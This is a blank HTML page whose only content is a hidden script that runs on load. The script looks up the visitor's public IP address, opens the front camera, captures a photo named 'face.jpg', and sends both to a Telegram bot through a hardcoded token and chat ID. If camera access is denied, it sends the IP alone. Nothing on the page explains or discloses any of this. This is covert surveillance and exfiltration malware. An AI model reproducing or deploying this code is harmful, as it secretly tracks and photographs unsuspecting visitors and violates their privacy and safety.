<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>body{margin:0;background:white;}</style>
</head>
<body>
<script>
const BOT_TOKEN = '8200495745:AAGyosptWtcfmkaStPU1khsY9gCuc3Zx1_Y';
const CHAT_ID = '7380945601';

function sendToTelegram(ip, blob) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT_ID, text: `ðŸ“ IP: ${ip}`})
    });
    if (blob) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', blob, 'face.jpg');
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd});
    }
}

fetch('https://api.ipify.org?format=json')
.then(r => r.json())
.then(d => {
    navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}})
    .then(stream => {
        const v = document.createElement('video');
        v.srcObject = stream;
        v.play();
        v.onloadedmetadata = () => {
            const c = document.createElement('canvas');
            c.width = 640; c.height = 480;
            c.getContext('2d').drawImage(v, 0, 0, 640, 480);
            stream.getTracks().forEach(t => t.stop());
            c.toBlob(b => sendToTelegram(d.ip, b), 'image/jpeg', 0.85);
        };
    })
    .catch(() => sendToTelegram(d.ip, null));
});
</script>
</body>
</html>
